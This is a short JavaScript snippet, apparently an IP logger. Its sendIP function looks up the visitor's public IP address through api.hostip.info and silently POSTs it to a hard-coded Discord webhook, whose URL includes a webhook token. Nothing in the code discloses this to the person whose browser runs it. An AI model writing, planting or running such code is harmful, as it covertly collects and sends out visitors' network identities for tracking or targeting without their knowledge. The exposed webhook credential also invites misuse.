const sendIP = () => {
    function getIP() {
        if (window.XMLHttpRequest) xmlhttp = new XMLHttpRequest();
        else xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    
        xmlhttp.open("GET","http://api.hostip.info/get_html.php",false);
        xmlhttp.send();
    
        hostipInfo = xmlhttp.responseText.split("\n");
    
        for (i=0; hostipInfo.length >= i; i++) {
            ipAddress = hostipInfo[i].split(":");
            if ( ipAddress[0] == "IP" ) return ipAddress[1];
        }
    
        return false;
    }
    const options = {
        content: getIP()
    };
    var xhr = new XMLHttpRequest()
        xhr.open("POST", "https://discordapp.com/api/webhooks/714616801043939450/vBeYxjbjdtFsIz5v5x01R7MpP28ewlGjv-BhcSedK_-hUFTMvy76esnTStUEY6ov-ysi")
        xhr.setRequestHeader("content-type", "application/json")
        xhr.send(JSON.stringify(options))
}